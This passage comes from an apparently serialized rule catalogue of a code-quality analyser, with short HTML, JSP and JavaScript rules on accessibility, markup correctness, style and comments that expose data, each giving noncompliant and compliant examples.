the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = b + c   # This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
# This very long comment is better placed before the line of code
a = b + c
</pre>Z
CODE_SMELL
„
Web:FrameWithoutTitleCheckƒ
WebFrameWithoutTitleCheck*"<frames>" should have a "title" attribute"MINOR*web:Á<p>Frames allow different web pages to be put together on the same visual space. Users without disabilities can easily scan the contents of all frames
at once. However, visually impaired users using screen readers hear the page content linearly.</p>
<p>The <code>title</code> attribute is used to list all the page's frames, enabling those users to easily navigate among them. Therefore, the
<code>&lt;frame&gt;</code> and <code>&lt;iframe&gt;</code> tags should always have a <code>title</code> attribute.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;frame src="index.php?p=menu"&gt;                                      &lt;-- Non-Compliant --&gt;
&lt;frame src="index.php?p=home" name="contents"&gt;                      &lt;-- Non-Compliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;frame src="index.php?p=menu" title="Navigation menu"&gt;              &lt;-- Compliant --&gt;
&lt;frame src="index.php?p=home" title="Main content" name="contents"&gt; &lt;-- Compliant --&gt;
</pre>ZBUG
É
Web:UnclosedTagCheckÍ
WebUnclosedTagCheckAll HTML tags should be closed"MINOR*web:ü<p>Even if all browsers are fault-tolerant, HTML tags should be closed to prevent any unexpected behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Test Page    &lt;!-- Noncompliant; title not closed --&gt;
  &lt;!-- Noncompliant; head not closed --&gt;
  &lt;body&gt;
    &lt;em&gt;Emphasized Text  &lt;!-- Noncompliant; em not closed --&gt;
  &lt;!-- Noncompliant; body not closed --&gt;
&lt;/html&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Test Page&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;em&gt;Emphasized Text&lt;/em&gt;
  &lt;/body&gt;
&lt;/html&gt;
</pre>ZBUG
∆
Web:AvoidHtmlCommentCheck®
WebAvoidHtmlCommentCheck HTML comments should not be used"MINOR*web:Ã<p>Using HTML-style comments in a page that will be generated or interpolated server-side before being served to the user increases the risk of
exposing data that should be kept private. For instance, a developer comment or line of debugging information that's left in a page could easily (and
has) inadvertently expose:</p>
<ul>
  <li> Version numbers and host names </li>
  <li> Full, server-side path names </li>
  <li> Sensitive user data </li>
</ul>
<p>Because every other language has its own native comment format, there is no justification for using HTML-style comments in anything other than a
pure HTML or XML file.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;%
      out.write("&lt;!-- ${username} --&gt;");  // Noncompliant
  %&gt;
      &lt;!-- &lt;% out.write(userId) %&gt; --&gt;  // Noncompliant
      &lt;!-- #{userPhone} --&gt;  // Noncompliant
      &lt;!-- ${userAddress} --&gt; // Noncompliant

      &lt;!-- Replace 'world' with name --&gt; // Noncompliant
      &lt;h2&gt;Hello world!&lt;/h2&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
      &lt;%-- Replace 'world' with name --%&gt;  // Compliant
      &lt;h2&gt;Hello world!&lt;/h2&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/615.html">MITRE, CWE-615</a> - Information Exposure Through Comments </li>
</ul>ZVULNERABILITY
˙

Web:ServerSideImageMapsCheckŸ

WebServerSideImageMapsCheck=Server-side image maps ("ismap" attribute) should not be used"MINOR*web:Á	<p>The <code>ismap</code> attribute in an <code>img</code> tag creates a server-side image map: The browser sends the coordinates of the clicked point
to the server.</p>
<p>For any person who cannot use a mouse, this form of navigation is inaccessible because it is the position of the cursor on the image that
determines the action.</p>
<p>On the other hand, client-side image maps, which use the <code>usemap</code> attribute allow for each clickable area to specify an alternate text,
enabling accessibility for the blind.</p>
<p>Further, in terms of separation of concerns, it is definitely better to leave the task of mapping pixels to links to the client.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;a href="click_on_world_map.php" target="_self"&gt;
  &lt;img src="world_map.png" ismap&gt;              &lt;!-- Noncompliant --&gt;
&lt;/a&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;img src="world_map.png" usemap="#world_map"&gt;

&lt;map name="world_map"&gt;
  &lt;area shape="rect" coords="0,0,10,10" href="france.html" alt="France"&gt;
  &lt;area shape="circle" coords="20,20,10" href="spain.html" alt="Spain"&gt;
  &lt;area shape="circle" coords="30,30,8" href="england.html" alt="England"&gt;
  &lt;!-- ... --&gt;
&lt;/map&gt;
</pre>ZBUG
º
Web:WhiteSpaceAroundCheckû
WebWhiteSpaceAroundCheck*White space should be used in JSP/JSF tags"MINOR*web:ª<p>The proper use of white space makes a major contribution to code readability. </p>
<p>This rule raises an issue when there is not a space character after the beginning and before the end of each comment (<code>&lt;!-- ...
--&gt;</code>), directive (<code>&lt;%@ ... %&gt;</code>), and expression (<code>&lt;% ... %&gt;</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!--Do the thing--&gt;  &lt;!-- Noncompliant; missing space at beginning and end of text--&gt;
&lt;%@page import="java.io.*,java.util.*" %&gt; &lt;!-- Noncompliant; missing space at beginning --&gt;
&lt;% String title = "My Page";%&gt; &lt;!-- Noncompliant; missing space at end --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!-- Do the thing --&gt;
&lt;%@ page import="java.io.*,java.util.*" %&gt;
&lt;% String title = "My Page"; %&gt;
</pre>Z
CODE_SMELL
Ç
Web:DoubleQuotesCheckË
WebDoubleQuotesCheckGAttributes should be quoted using double quotes rather than single ones"MINOR*web:Ï<p>Checker to find use of single quote where double quote is preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;div id='header'&gt;&lt;/div&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;div id="header"&gt;&lt;/div&gt;
</pre>Z
CODE_SMELL
™
Web:TableWithoutCaptionCheckâ
WebTableWithoutCaptionCheck("<table>" tags should have a description"MINOR*web:¨<p>In order to be accessible to visually impaired users, it is important that tables provides a description of its content before the data is
accessed.</p>
<p>The simplest way to do it, and also the one <a href="https://www.w3.org/TR/WCAG20-TECHS/H39">recommended by WCAG2</a> is to add a
<code>&lt;caption&gt;</code> element inside the <code>&lt;table&gt;</code>.</p>
<p>Other technics this rule accepts are:</p>
<ul>
  <li> referencing the description element with an <code>aria-describedby</code> attribute in the <code>&lt;table&gt;</code>. </li>
  <li> embedding the <code>&lt;table&gt;</code> inside a <code>&lt;figure&gt;</code> which also contains a <code>&lt;figcaption&gt;</code>. </li>
  <li> adding a <code>summary</code> attribute to the <code>&lt;table&gt;</code> tag. However note that this attribute has been deprecated in HTML5.
  </li>
</ul>
<p>See&nbsp;<a href="https://www.w3.org/WAI/tutorials/tables/tips/">W3C WAI&nbsp;Web Accessibility Tutorials</a>&nbsp;for more information.</p>
<p>This rule raises an issue when a <code>&lt;table&gt;</code> has neither of the previously mentioned description mechanisms.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;table&gt; &lt;!-- Noncompliant --&gt;
  ...
&lt;table&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Adding a <code>&lt;caption&gt;</code> element.</p>
<pre>
&lt;table&gt;
  &lt;caption&gt;New York City Marathon Results 2013&lt;/caption&gt;
  ...
&lt;/table&gt;
</pre>
<p>Adding an <code>aria-describedby</code> attribute.</p>
<pre>
&lt;p id="mydesc"&gt;New York City Marathon Results 2013&lt;/p&gt;
&lt;table aria-describedby="mydesc"&gt;
  ...
&lt;/table&gt;
</pre>
<p>Embedding the table in a <code>&lt;figure&gt;</code> which also contains a <code>&lt;figcaption&gt;</code>.</p>
<pre>
&lt;figure&gt;
  &lt;figcaption&gt;New York City Marathon Results 2013&lt;/figcaption&gt;
  &lt;table&gt;
    ...
  &lt;/table&gt;
&lt;/figure&gt;
</pre>
<p>Adding a <code>summary</code> attribute.</p>
<pre>
&lt;table summary="New York City Marathon Results 2013"&gt;
  ...
&lt;/table&gt;
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised on <code>&lt;table&gt;</code> used for layout purpose, i.e. when it contains a <code>role</code> attribute set to
<code>"presentation"</code> or <code>"none"</code>. Note that using <code>&lt;table&gt;</code> for layout purpose is a bad practice.</p>
<p>No issue will be raised either on <code>&lt;table&gt;</code> containing an <code>aria-hidden</code> attribute set to <code>"true"</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-content-structure-separation-programmatic">WCAG2, 1.3.1</a>&nbsp;-&nbsp;Info
  and Relationships </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H39">WCAG2,&nbsp;H39</a> - Using caption elements to associate data table captions with data tables
  </li>
</ul>ZBUG
ƒ
Web:BoldAndItalicTagsCheck•
WebBoldAndItalicTagsCheck)"<strong>" and "<em>" tags should be used"MINOR*web:…<p>The <code>&lt;strong&gt;</code>/<code>&lt;b&gt;</code> and <code>&lt;em&gt;</code>/<code>&lt;i&gt;</code> tags have exactly the same effect in most
web browsers, but there is a fundamental difference between them: <code>&lt;strong&gt;</code> and <code>&lt;em&gt;</code> have a semantic meaning
whereas <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> only convey styling information like CSS. </p>
<p>While <code>&lt;b&gt;</code> can have simply no effect on a some devices with limited display or when a screen reader software is used by a blind
person, <code>&lt;strong&gt;</code> will:</p>
<ul>
  <li> Display the text bold in normal browsers </li>
  <li> Speak with lower tone when using a screen reader such as Jaws </li>
</ul>
<p>Consequently:</p>
<ul>
  <li> in order to convey semantics, the <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> tags shall never be used, </li>
  <li> in order to convey styling information, the <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> should be avoided and CSS should be used instead.
  </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;i&gt;car&lt;/i&gt;             &lt;!-- Noncompliant --&gt;
&lt;b&gt;train&lt;/b&gt;         &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;em&gt;car&lt;/em&gt;
&lt;strong&gt;train&lt;/strong&gt;
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in case of <a href="https://www.w3.org/WAI/GL/wiki/Using_aria-hidden%3Dtrue_on_an_icon_font_that_AT_should_ignore">icon
fonts</a> usage.</p>
<pre>
&lt;i class="..." aria-hidden="true" /&gt;    &lt;!-- Compliant icon fonts usage --&gt;
</pre>ZBUG
∂
	Web:S5264®
WebS52645"<object>" tags should provide an alternative content"MINOR*web: <p>Assistive technologies, such as screen readers, will not be able to render <code>&lt;object&gt;</code> elements, in such cases it is the content of
the <code>&lt;object&gt;</code> which is provided to the user. This alternative content needs to be accessible or the screen readers won't be able to
use it. For example, if an <code>&lt;img&gt;</code> is used it must contain an \<code>alt</code> attribute (see corresponding rule
Web:ImgWithoutAltCheck).</p>
<p>This rule raises an issue when an <code>&lt;object&gt;</code> tag does not have any alternative content.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;object&gt;&lt;/object&gt; &lt;!-- Noncompliant --&gt;

&lt;object&gt;
  &lt;object&gt;&lt;/object&gt; &lt;!-- Noncompliant --&gt;
&lt;/object&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;object&gt;This application shows the simulation of two particles colliding&lt;/object&gt;

&lt;object&gt;
  &lt;img src="flower.png" alt="Flower growing in a pot" /&gt;
&lt;/object&gt;

&lt;object&gt;
  &lt;object&gt;
    This application shows the simulation of two particles colliding
  &lt;/object&gt;
&lt;/object&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H53.html">WCAG2, H53</a> - Using the body of the object element </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-text-equiv-all">WCAG2, 1.1.1</a> - Non-text Content </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-media-equiv-audio-desc">WCAG2, 1.2.3</a> - Audio Description or Media
  Alternative (Prerecorded) </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-media-equiv-text-doc">WCAG2, 1.2.8</a> - Media Alternative (Prerecorded) </li>
</ul>Z
CODE_SMELL
ò
,Web:MouseEventWithoutKeyboardEquivalentCheckÁ
Web(MouseEventWithoutKeyboardEquivalentCheck6Mouse events should have corresponding keyboard events"MINOR*web:Ï<p>Offering the same experience with the mouse and the keyboard allow users to pick their preferred devices.</p>
<p> Additionally, users of assistive technology will also be able to browse the site even if they cannot use the mouse.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> an HTML element with an <code>onMouseover</code> attribute doesn't also have an&nbsp;<code>onFocus&nbsp;attribute.</code> </li>
  <li> an HTML element with an <code>onMouseout</code> attribute doesn't also have an&nbsp;<code>onBlur&nbsp;attribute.</code> </li>
  <li> an HTML element with an <code>onClick</code> attribute doesn't also have one of the following attributes: <code>onKeyDown</code>,
  <code>onKeyUp</code>, <code>onKeyPress</code>. </li>
</ul>
<p>Note that in the case of&nbsp;<code>onClick</code>, the equivalent keyboard handler should support both the "Enter" and "Space" keys as these are
usually used by screen-readers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;div onClick="doSomething();" ...&gt;                                &lt;!-- Noncompliant - 'onKeyDown/onKeyUp/onKeyPress' missing --&gt;
&lt;a onMouseover="doSomething();" ...&gt;                            &lt;!-- Noncompliant - 'onFocus' missing --&gt;
&lt;a onMouseout="doSomething();" ...&gt;                             &lt;!-- Noncompliant - 'onBlur' missing --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Note that setting the <code>tabindex</code> attribute is necessary to make the <code>&lt;div&gt;</code> element focusable.</p>
<pre>
&lt;div onClick="doSomething();" onKeyDown="doSomething();" tabindex="0" ...&gt;    &lt;!-- Compliant --&gt;
&lt;a onMouseover="doSomething();" onFocus="doSomething();" ...&gt;   &lt;!-- Compliant --&gt;
&lt;a onMouseout="doSomething();" onBlur="doSomething();" ...&gt;     &lt;!-- Compliant --&gt;
</pre>
<h2>Exceptions</h2>
<p>For the following elements, <a href="https://www.w3.org/TR/WCAG20-TECHS/SCR35.html">pressing a key will trigger the <code>onClick</code>
attribute</a>: <code>&lt;input type="button"&gt;</code>, <code>&lt;input type="submit"&gt;</code>, <code>&lt;button&gt;</code>,
<code>&lt;a&gt;</code>. Thus no issue will be raised when an <code>onClick</code> attribute is found in these elements without a
<code>onKeyDown/onKeyUp/onKeyPress</code>.</p>
<p>An issue will still be raised for <a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role">elements with the
<code>role="button"</code> attribute</a> as they don't behave the same way.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/SCR2.html">SCR2: Using redundant keyboard and mouse event handlers</a> </li>
</ul>ZBUG
±%
Web:ImgWithoutAltCheckñ%
WebImgWithoutAltCheckEImage, area and button with image tags should have an "alt" attribute"MINOR*web:¢$<p>The <code>alt</code> attribute provides a textual alternative to an image.</p>
<p>It is used whenever the actual image cannot be rendered.</p>
<p>Common reasons for that include:</p>
<ul>
  <li> The image can no longer be found </li>
  <li> Visually impaired users using a screen reader software </li>
  <li> Images loading is disabled, to reduce data consumption on mobile phones </li>
</ul>
<p>It is also very important to not set an <code>alt</code> attribute to a non-informative value. For example <code>&lt;img ... alt="logo"&gt;</code>
is useless as it doesn't give any information to the user. In this case, as for any other decorative image, it is better to use a CSS background image
instead of an <code>&lt;img&gt;</code> tag. If using CSS background-image is not possible, an empty <code>alt=""</code> is tolerated. See Exceptions
bellow.</p>
<p>This rule raises an issue when</p>
<ul>
  <li> an <code>&lt;input type="image"&gt;</code> tag or an <code>&lt;area&gt;</code> tag have no <code>alt</code> attribute or their
  <code>alt</code>&nbsp;attribute has an empty string value. </li>
  <li> an <code>&lt;img&gt;</code> tag has no <code>alt</code> attribute. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;img src="foo.png" /&gt; &lt;!-- Noncompliant --&gt;
&lt;input type="image" src="bar.png" /&gt; &lt;!-- Noncompliant --&gt;
&lt;input type="image" src="bar.png" alt="" /&gt; &lt;!-- Noncompliant --&gt;

&lt;img src="house.gif" usemap="#map1"
    alt="rooms of the house." /&gt;
&lt;map id="map1" name="map1"&gt;
  &lt;area shape="rect" coords="0,0,42,42"
    href="bedroom.html"/&gt; &lt;!-- Noncompliant --&gt;
  &lt;area shape="rect" coords="0,0,21,21"
    href="lounge.html" alt=""/&gt; &lt;!-- Noncompliant --&gt;
&lt;/map&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;img src="foo.png" alt="Some textual description of foo.png" /&gt;
&lt;input type="image" src="bar.png" alt="Textual description of bar.png" /&gt;

&lt;img src="house.gif" usemap="#map1"
    alt="rooms of the house." /&gt;
&lt;map id="map1" name="map1"&gt;
  &lt;area shape="rect" coords="0,0,42,42"
    href="bedroom.html" alt="Bedroom" /&gt;
  &lt;area shape="rect" coords="0,0,21,21"
    href="lounge.html" alt="Lounge"/&gt;
&lt;/map&gt;
</pre>
<h2>Exceptions</h2>
<p><code>&lt;img&gt;</code> tags with empty string&nbsp;<code>alt=""</code> attributes won't raise any issue. However this technic should be used in
two cases only:</p>
<p>When the image is decorative and it is not possible to use a CSS background image. For example, when the decorative <code>&lt;img&gt;</code> is
generated via javascript with a source image coming from a database, it is better to use an <code>&lt;img alt=""&gt;</code> tag rather than generate
CSS code.</p>
<pre>
&lt;li *ngFor="let image of images"&gt;
    &lt;img [src]="image" alt=""&gt;
&lt;/li&gt;
</pre>
<p>When the image is not decorative but it's <code>alt</code> text would repeat a nearby text. For example, images contained in links should not
duplicate the link's text in their <code>alt</code> attribute, as it would make the screen reader repeat the text twice.</p>
<pre>
&lt;a href="flowers.html"&gt;
    &lt;img src="tulip.gif" alt="" /&gt;
    A blooming tulip
&lt;/a&gt;
</pre>
<p>In all other cases you should use CSS background images.</p>
<p>See&nbsp;<a href="https://www.w3.org/WAI/tutorials/images/decision-tree/">W3C WAI&nbsp;Web Accessibility Tutorials</a>&nbsp;for more
information.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H24.html">WCAG2, H24</a> - Providing text alternatives for the area elements of image maps </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H36.html">WCAG2, H36</a> - Using alt attributes on images used as submit buttons </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H37.html">WCAG2, H37</a> - Using alt attributes on img elements </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H67.html">WCAG2, H67</a> - Using null alt text and no title attribute on img elements for images
  that AT should ignore </li>
  <li> <a href="https://www.w3.org/TR/WCAG20-TECHS/H2.html">WCAG2, H2</a> - Combining adjacent image and text links for the same resource </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-text-equiv-all">WCAG2, 1.1.1</a> - Non-text Content </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-navigation-mechanisms-refs">WCAG2, 2.4.4</a> - Link Purpose (In Context) </li>
  <li> <a href="https://www.w3.org/WAI/WCAG21/quickref/?versions=2.0#qr-navigation-mechanisms-link">WCAG2, 2.4.9</a> - Link Purpose (Link Only) </li>
</ul>ZBUG
÷
Web:NonConsecutiveHeadingCheck≥
WebNonConsecutiveHeadingCheck;Heading tags should be used consecutively from "H1" to "H6""MINOR*web:∫<p>Heading tags are used by search engines and screen reader softwares to construct an outline of the page.</p>
<p>Starting at <code>&lt;h1&gt;</code> and not skipping any level eases this automatic construction.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;h2&gt;My Title&lt;/h2&gt;     &lt;!-- Non-Compliant - h1 is not being used --&gt;

&lt;h3&gt;My Sub Title&lt;/h3&gt; &lt;!-- Compliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;h1&gt;My Title&lt;/h1&gt;     &lt;!-- Compliant --&gt;

&lt;h2&gt;My Sub Title&lt;/h2&gt; &lt;!-- Compliant --&gt;
</pre>Z
CODE_SMELL
û
Web:MultiplePageDirectivesCheck˙
WebMultiplePageDirectivesCheck-Multiple "page" directives should not be used"MINOR*web:é<p>While you can use as many <code>page</code> directives as you like, it is more readable to set multiple page attributes in a single directive.</p>
<p>The exception to this rule is when multiple packages are being imported. In that case, imports may be done in separate directives and all other
attributes should be set in a single, additional directive.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;%@ page session="false" %&gt;
&lt;%@ page import="java.util.*" %&gt;
&lt;%@ page errorPage="error.jsp" %&gt; &lt;!-- Noncompliant --&gt;
&lt;%@ page import="java.text.*" %&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;%@ page session="false"
                   errorPage="error.jsp" %&gt;
&lt;%@ page import="java.util.*" %&gt;
&lt;%@ page import="java.text.*" %&gt;
</pre>Z
CODE_SMELL
›
$Web:FlashUsesBothObjectAndEmbedCheck¥
Web FlashUsesBothObjectAndEmbedCheckGFlash animations should be embedded using both "<object>" and "<embed>""MINOR*web:∞<p>The <code>&lt;object&gt;</code> tag is used by Internet Explorer 3.0 or later on Windows platforms or any browser that supports the use of the
Flash ActiveX control. The <code>&lt;embed&gt;</code> tag is used by Netscape Navigator 2.0 or later, or browsers that support the use of the
Netscape-compatible plug-in version of Flash Player.</p>
<p>When an ActiveX-enabled browser loads the HTML page, it reads the values set on the <code>&lt;object&gt;</code> and ignores the
<code>&lt;embed&gt;</code> tag. When browsers using the Flash plug-in load the HTML page, they read the values set on the <code>&lt;embed&gt;</code>
tag and ignore the <code>&lt;object&gt;</code> tag.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100" height="100"&gt;      &lt;!-- Non-Compliant --&gt;
  &lt;param name="movie" value="movie_name.swf" /&gt;
&lt;/object&gt;

&lt;embed src="movie_name.swf"                                                                 &lt;!-- Non-Compliant --&gt;
       width="550"
       height="400"
       type="application/x-shockwave-flash"
       pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100" height="100"&gt;      &lt;!-- Compliant --&gt;
  &lt;param name="movie" value="movie_name.swf" /&gt;
  &lt;embed src="movie_name.swf"                                                               &lt;!-- Compliant --&gt;
       width="550"
       height="400"
       type="application/x-shockwave-flash"
       pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;
&lt;/object&gt;
</pre>ZBUG
¨
Web:IllegalTabCheckî
WebIllegalTabCheck(Tabulation characters should not be used"MINOR*web:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
Ã
Web:WmodeIsWindowCheck±
WebWmodeIsWindowCheck9Flash animations should be embedded using the window mode"MINOR*web:…<p>Browsers best support the <code>window</code> mode for the <code>wmode</code> parameter, also in terms of accessibility.</p>
<p>As it is the default mode, it is acceptable to either not specify a <code>wmode</code> parameter altogether, or to set it explicitly to
<code>window</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="550" height="400"&gt;
  &lt;param name="movie" value="movie_name.swf" /&gt;
  &lt;param name="wmode" value="direct" /&gt;                              &lt;!-- Non-Compliant --&gt;
&lt;/object&gt;

&lt;embed src="movie_name.swf"
       width="550"
       height="400"
       wmode="direct"                                                                 &lt;!-- Non-Compliant --&gt;
       type="application/x-shockwave-flash"
       pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="550" height="400"&gt;
  &lt;param name="movie" value="movie_name.swf" /&gt;
&lt;/object&gt;

&lt;embed src="movie_name.swf"
       width="550"
       height="400"
       type="application/x-shockwave-flash"
       pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;
</pre>
<p>or</p>
<pre>
&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="550" height="400"&gt;
  &lt;param name="movie" value="movie_name.swf" /&gt;
  &lt;param name="wmode" value="window" /&gt;
&lt;/object&gt;

&lt;embed src="movie_name.swf"
       width="550"
       height="400"
       wmode="window"
       type="application/x-shockwave-flash"
       pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;
</pre>ZBUG
ú

Web:FieldsetWithoutLegendCheck˘	
WebFieldsetWithoutLegendCheck-"<fieldset>" tags should contain a "<legend>""MINOR*web:ï	<p>For users of assistive technology such as screen readers, it may be challenging to know what is expected in each form's input. The input's label
alone might not be sufficient: 'street' could be part of a billing or a shipping address for instance.</p>
<p>Fieldset legends are read out loud by screen readers before the label each time the focus is set on an input. For example, a legend 'Billing
address' with a label 'Street' will read 'Billing address street'. Legends should be short, and 'Your' should not be repeated in both the legend and
the label, as it would result in 'Your address Your City' being read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;fieldset&gt;                                 &lt;!-- Noncompliant --&gt;
  Street: &lt;input type="text"&gt;&lt;br /&gt;
  Town: &lt;input type="text"&gt;&lt;br /&gt;
  Country: &lt;input type="text"&gt;&lt;br /&gt;
&lt;/fieldset&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;fieldset&gt;
  &lt;legend&gt;Billing address&lt;/legend&gt;
  Street: &lt;input type="text"&gt;&lt;br /&gt;
  Town: &lt;input type="text"&gt;&lt;br /&gt;
  Country: &lt;input type="text"&gt;&lt;br /&gt;
&lt;/fieldset&gt;
</pre>ZBUG
Á
%Web:ItemTagNotWithinContainerTagCheckΩ
Web!ItemTagNotWithinContainerTagCheckP"<li>" and "<dt>" item tags should be in "<ul>", "<ol>" or "<dl>" container tags"MINOR*web:Ø<p>Using a <code>&lt;li&gt;</code> or <code>&lt;dt&gt;</code> item tag outside of a <code>&lt;ul&gt;</code>, <code>&lt;ol&gt;</code> or
<code>&lt;dl&gt;</code> one does not make sense and indicates a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;li&gt;Apple&lt;/li&gt;          &lt;!-- Noncompliant --&gt;
&lt;li&gt;Strawberry&lt;/li&gt;     &lt;!-- Noncompliant --&gt;

&lt;li&gt;Apple&lt;/li&gt;          &lt;!-- Noncompliant --&gt;
&lt;li&gt;Strawberry&lt;/li&gt;     &lt;!-- Noncompliant --&gt;

&lt;dt&gt;Apple&lt;/dt&gt;          &lt;!-- Noncompliant --&gt;
&lt;dt&gt;Strawberry&lt;/dt&gt;     &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;ul&gt;
  &lt;li&gt;Apple&lt;/li&gt;
  &lt;li&gt;Strawberry&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;Apple&lt;/li&gt;
  &lt;li&gt;Strawberry&lt;/li&gt;
&lt;/ol&gt;

&lt;dl&gt;
  &lt;dt&gt;Apple&lt;/dt&gt;
  &lt;dt&gt;Strawberry&lt;/dt&gt;
&lt;/dl&gt;
</pre>ZBUG
”
javascript:S1940æ

javascriptS1940%Boolean checks should not be inverted"MINOR*js:Í<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a === 2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a !== 2) { ... }
</pre>Z
CODE_SMELL
¢
javascript:S3317ç

javascriptS33170Default export names and file names should match"MINOR*js:Æ<p>By convention, a file that exports only one class, function, or constant should be named for that class, function or constant. Anything else may
confuse maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// file path: myclass.js  -- Noncompliant
class MyClass {
  // ...
}
export default MyClass;
</pre>
<h2>Compliant Solution</h2>
<pre>
// file path: MyClass.js
class MyClass {
  // ...
}
export default MyClass;
</pre>Z
CODE_SMELL
Ω
javascript:S1264®

javascriptS12645A "while" loop should be used instead of a "for" loop"MINOR*js:ƒ<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>Z
CODE_SMELL
´
javascript:S3533ñ

javascriptS35330"import" should be used to include external code"MINOR*js:∑<p>Before ECMAScript 2015, module management had to be ad-hoc or provided by 3rd-party libraries such as Node.js, Webpack, or RequireJS. Fortunately,
ES2015, provides language-standard mechanisms for module management, <code>import</code> and <code>export</code>, and older usages should be
converted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// circle.js
exports.area = function (r) {
  return PI * r * r;
};

// foo.js
define(["./cart", "./horse"], function(cart, horse) {  // Noncompliant
  // ...
});

// bar.js
const circle = require('./circle.js');  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
// circle.js
let area = function (r) {
